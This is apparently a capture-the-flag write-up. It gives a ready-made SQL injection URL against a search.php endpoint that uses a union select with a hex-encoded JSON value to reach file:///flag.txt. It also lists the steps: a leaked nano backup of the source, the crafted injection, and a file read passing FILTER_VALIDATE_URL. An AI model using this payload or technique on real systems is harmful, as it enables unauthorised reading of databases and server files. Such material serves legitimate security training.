# POC

your_host/search.php?title=%1$s&titlE=in%20title)%20union%20select%201,2,3,0x7b22666c6167223a747275652c2275726c223a2266696c653a2f2f2f666c61672e747874227d%23

The challenge is filled with best youtube music links 😄

# Steps

-   find search.php, no need to bruteforce
-   there is search.php.save because nano
-   now you can see source and craft SQLi. (similar to https://hackerone.com/reports/179920)
-   last step LFI, there are misleading comments., file:///... is valid for FILTER_VALIDATE_URL
